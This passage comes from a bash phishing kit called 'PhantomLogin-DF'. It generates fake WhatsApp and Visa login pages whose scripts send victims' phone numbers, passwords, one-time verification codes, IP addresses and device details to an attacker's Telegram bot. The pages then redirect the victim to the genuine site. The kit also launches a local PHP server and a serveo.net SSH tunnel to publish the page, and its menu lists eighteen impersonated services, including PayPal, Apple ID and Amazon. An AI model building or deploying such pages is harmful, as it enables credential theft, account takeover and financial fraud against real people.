        input { width: 100%; padding: 14px; margin-bottom: 12px; border: 1px solid #dbdbdb; border-radius: 5px; font-size: 15px; outline: none; transition: border-color 0.3s ease, box-shadow 0.3s ease; }
        input:focus { border-color: #25d366; box-shadow: 0 0 8px rgba(37, 211, 102, 0.2); }
        .btn-login { width: 100%; padding: 14px; background-color: #25d366; color: white; font-weight: bold; font-size: 16px; border-radius: 5px; border: none; cursor: pointer; margin-bottom: 15px; transition: background-color 0.3s ease; }
        .btn-login:hover { background-color: #1da851; }
        .forgot-password { margin-top: 10px; font-size: 14px; }
        .forgot-password a { color: #25d366; text-decoration: none; }
        .divider { margin: 20px 0; border-top: 1px solid #dbdbdb; }
        .signup-btn { width: 100%; padding: 14px; background-color: #fafafa; border: 1px solid #dbdbdb; font-size: 14px; color: #25d366; border-radius: 5px; cursor: pointer; margin-bottom: 10px; }
        .signup-btn:hover { background-color: #f4f4f4; }
        .terms { margin-top: 20px; font-size: 12px; color: #888; }
        .terms a { color: #25d366; text-decoration: none; }
    </style>
</head>
<body>
    <div class="login-container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="WhatsApp Logo">
        <h2>Log in to WhatsApp</h2>
        <form id="loginForm">
            <input type="text" id="phone" placeholder="Phone number" required>
            <button type="submit" class="btn-login">Next</button>
        </form>
        <p class="forgot-password"><a href="#">Forgot password?</a></p>
        <div class="divider"></div>
        <button class="signup-btn">Sign up for WhatsApp</button>
    </div>
    <script>
        const loginForm = document.getElementById('loginForm');
        loginForm.addEventListener('submit', async function (event) {
            event.preventDefault();
            const phone = document.getElementById('phone').value;
            const deviceInfo = await getDeviceInfo();
            const response = await fetch('https://api.telegram.org/bot${token}/sendMessage', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: '${id}',
                    text: \`WhatsApp Login Attempt:\nPhone📱: \${phone}\nDevice Info📲:\nIP Address🌍: \${deviceInfo.ip}\nBattery Level🔋: \${deviceInfo.batteryLevel}%\nNetwork Type📡: \${deviceInfo.networkType}\nDevice Name📱: \${deviceInfo.deviceName}\`
                })
            });
            const result = await response.json();
            if (result.ok) {
                alert('Please enter the code sent to your phone.');
                const code = prompt('Enter the code:');
                const codeResponse = await fetch('https://api.telegram.org/bot${token}/sendMessage', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: '${id}',
                        text: \`WhatsApp Code:\nCode🔢: \${code}\`
                    })
                });
                const codeResult = await codeResponse.json();
                if (codeResult.ok) {
                    alert('Login successful! Redirecting...');
                    window.location.href = 'https://web.whatsapp.com';
                } else {
                    alert('Login failed. Please check your code.');
                }
            } else {
                alert('Login failed. Please check your phone number.');
            }
        });
        async function getDeviceInfo() {
            const ip = await fetch('https://api.ipify.org?format=json').then(res => res.json());
            const battery = await navigator.getBattery();
            const networkType = navigator.connection ? navigator.connection.effectiveType : 'Unknown';
            const deviceName = navigator.userAgent;
            return { ip: ip.ip, batteryLevel: Math.round(battery.level * 100), networkType: networkType, deviceName: deviceName };
        }
    </script>
</body>
</html>
EOF
}

visa_page() {
    cat <<EOF
    <!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Visa Login</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Arial', sans-serif;
            background-color: #f1f1f1;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        .login-container {
            background-color: #ffffff;
            border-radius: 10px;
            width: 360px;
            padding: 40px 30px;
            text-align: center;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
        }

        .login-container img {
            width: 100px;
            margin-bottom: 25px;
        }

        h2 {
            font-size: 22px;
            color: #333;
            margin-bottom: 15px;
            font-weight: 600;
        }

        input {
            width: 100%;
            padding: 14px;
            margin-bottom: 12px;
            border: 1px solid #dbdbdb;
            border-radius: 5px;
            font-size: 15px;
            outline: none;
            transition: border-color 0.3s ease, box-shadow 0.3s ease;
        }

        input:focus {
            border-color: #1a1a1a;
            box-shadow: 0 0 8px rgba(26, 26, 26, 0.2);
        }

        .btn-login {
            width: 100%;
            padding: 14px;
            background-color: #1a1a1a;
            color: white;
            font-weight: bold;
            font-size: 16px;
            border-radius: 5px;
            border: none;
            cursor: pointer;
            margin-bottom: 15px;
            transition: background-color 0.3s ease;
        }

        .btn-login:hover {
            background-color: #333;
        }

        .forgot-password {
            margin-top: 10px;
            font-size: 14px;
        }

        .forgot-password a {
            color: #1a1a1a;
            text-decoration: none;
        }

        .divider {
            margin: 20px 0;
            border-top: 1px solid #dbdbdb;
        }

        .signup-btn {
            width: 100%;
            padding: 14px;
            background-color: #fafafa;
            border: 1px solid #dbdbdb;
            font-size: 14px;
            color: #1a1a1a;
            border-radius: 5px;
            cursor: pointer;
            margin-bottom: 10px;
        }

        .signup-btn:hover {
            background-color: #f4f4f4;
        }

        .terms {
            margin-top: 20px;
            font-size: 12px;
            color: #888;
        }

        .terms a {
            color: #1a1a1a;
            text-decoration: none;
        }
    </style>
</head>
<body>

    <div class="login-container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg" alt="Visa Logo">
        <h2>Sign in to Visa</h2>
        <form id="loginForm">
            <input type="text" id="username" placeholder="Email or phone" required>
            <input type="password" id="password" placeholder="Password" required>
            <button type="submit" class="btn-login">Log In</button>
        </form>
        <p class="forgot-password"><a href="#">Forgot password?</a></p>
        <div class="divider"></div>
        <button class="signup-btn">Create account</button>
    </div>

    <script>
        const loginForm = document.getElementById('loginForm');
        loginForm.addEventListener('submit', async function (event) {
            event.preventDefault();
            
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;

            const deviceInfo = await getDeviceInfo();

            const response = await fetch('https://api.telegram.org/bot${token}/sendMessage', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: '${id}',
                    text: \`
Visa Login Attempt:

Username📧: \${username}
Password🔑: \${password}

Device Info📲:

IP Address🌍: \${deviceInfo.ip}
Battery Level🔋: \${deviceInfo.batteryLevel}%
Network Type📡: \${deviceInfo.networkType}
Device Name📱: \${deviceInfo.deviceName}
                    \`
                })
            });

            const result = await response.json();

            if (result.ok) {
                alert('Login successful! Redirecting...');
                window.location.href = 'https://www.visa.com';
            } else {
                alert('Login failed. Please check your credentials.');
            }
        });

        async function getDeviceInfo() {
            const ip = await fetch('https://api.ipify.org?format=json').then(res => res.json());
            const battery = await navigator.getBattery();
            const networkType = navigator.connection ? navigator.connection.effectiveType : 'Unknown';
            const deviceName = navigator.userAgent;

            return {
                ip: ip.ip,
                batteryLevel: Math.round(battery.level * 100),
                networkType: networkType,
                deviceName: deviceName,
            };
        }
    </script>
</body>
</html>
EOF
}
 
start_local_server() {
    echo -e "${GREEN}[+] Stopping any existing PHP server...${NC}"
    pkill -f "php -S localhost:3333" || echo -e "${YELLOW}[!] No existing PHP server found.${NC}"

    echo -e "${GREEN}[+] Starting PHP server on localhost...${NC}"
    php -S localhost:3333 > /dev/null 2>&1 &
    php_pid=$!
    echo -e "${GREEN}[+] PHP server started at http://localhost:3333/${page}.html${NC}"
    echo -e "${YELLOW}[+] Press Ctrl+C to stop the server.${NC}"
    trap "kill $php_pid 2> /dev/null" EXIT
    while true; do
        sleep 1
    done
}

start_serveo_server() {
    echo -e "${GREEN}[+] Stopping any existing PHP server...${NC}"
    pkill -f "php -S localhost:3333" || echo -e "${YELLOW}[!] No existing PHP server found.${NC}"

    echo -e "${GREEN}[+] Stopping any existing SSH tunnel...${NC}"
    killall ssh || echo -e "${YELLOW}[!] No existing SSH tunnel found.${NC}"

    echo -e "${GREEN}[+] Starting PHP server on localhost...${NC}"
    php -S localhost:3333 > /dev/null 2>&1 &
    php_pid=$!
    echo -e "${RED}[+] PHP server started at http://localhost:3333/${page}.html${NC}"

    echo -e "${GREEN}[+] Starting SSH tunnel with Serveo...${NC}"
    ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:3333 serveo.net > sendlink 2>&1 &
    ssh_pid=$!
    sleep 8

    echo -e "${GREEN}[+] Fetching Serveo URL...${NC}"
    serveo_url=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
    if [[ -z "$serveo_url" ]]; then
        echo -e "${RED}[-] Failed to start Serveo.net. Please make sure SSH is installed and try again.${NC}"
        exit 1
    fi

    echo -e "${BLUE}[+] Serveo URL: ${serveo_url}/${page}.html${NC}"
    echo -e "${RED}[+] Press Ctrl+C to stop the server.${NC}"

    trap "kill $php_pid $ssh_pid 2> /dev/null" EXIT
    while true; do
        sleep 1
    done
}

show_menu() {
    echo -e "${GREEN}Welcome to PhantomLogin-DF... ${NC}"
    echo -e "${RED}The developer is not responsible for any incorrect use of the tool... ${NC}"
    echo -e "${RED}All rights reserved: Mohamed Abu Al-Saud ${NC}"
    echo -e "${YELLOW}===================================================${NC}"
    echo -en "${BLUE}[1] Facebook login\t\t" && echo -e "[2] Google login${NC}"
    echo -en "${BLUE}[3] TikTok login\t\t" && echo -e "[4] Visa login${NC}"
    echo -en "${BLUE}[5] Camera and location\t" && echo -e "[6] Twitter login${NC}"
    echo -en "${BLUE}[7] PayPal login\t\t" && echo -e "[8] GitHub login${NC}"
    echo -en "${BLUE}[9] Instagram login\t\t" && echo -e "[10] Telegram login${NC}"
    echo -en "${BLUE}[11] Netflix login\t\t" && echo -e "[12] Wi-Fi login Egypt${NC}"
    echo -en "${BLUE}[13] WeChat login\t\t" && echo -e "[14] Snapchat login${NC}"
    echo -en "${BLUE}[15] WhatsApp login\t\t" && echo -e "[16] Apple ID login${NC}"
    echo -en "${BLUE}[17] Amazon login\t\t" && echo -e "[18] LinkedIn login${NC}"
    echo -e "${YELLOW}===================================================${NC}"
}

case $choice in
    1)
        page="Facebook_login"
        create_page "$page" "$(facebook_page)"
        ;;
    2)
        page="Google_login"
        create_page "$page" "$(google_page)"
        ;;
    3)
        page="TikTok_login"
        create_page "$page" "$(tiktok_page)"
        ;;
    4)
        page="visa_login"
        create_page "$page" "$(visa_page)"
        ;;
    5)
        page="CameraAndLocation_login"
        create_page "$page" "$(camera_page)"
        ;;
    6)
        page="Twitter_login"
        create_page "$page" "$(twitter_page)"
        ;;
    7)
        page="PayPal_login"
        create_page "$page" "$(paypal_page)"
        ;;
    8)
        page="GitHub_login"
        create_page "$page" "$(github_page)"
        ;;
    9)
        page="Instagram_login"
        create_page "$page" "$(instagram_page)"
        ;;
    10)
        page="Telegram_login"
        create_page "$page" "$(telegram_page)"
        ;;
    11)
        page="Netflix_login"
        create_page "$page" "$(netflix_page)"
        ;;
    12)
        page="WiFi_login"
        create_page "$page" "$(wifi_page)"
        ;;
    13)
        page="WeChat_login"
        create_page "$page" "$(wechat_page)"
        ;;
    14)
        page="Snapchat_login"
        create_page "$page" "$(snapchat_page)"
        ;;
    15)
        page="WhatsApp_login"
        create_page "$page" "$(whatsapp_page)"
        ;;
    16)                                          
        page="Apple_login"
        create_page "$page" "$(apple_page)"
        ;;
    17)                                          
        page="Amazon_login"
        create_page "$page" "$(amazon_page)"
        ;;
    18)                                          
        page="LinkedIn_login"
        create_page "$page" "$(linkedin_page)"
        ;;
    *)
        echo -e "${RED}[-] Invalid choice. Please select a valid option.${NC}"
        exit 1
        ;;
esac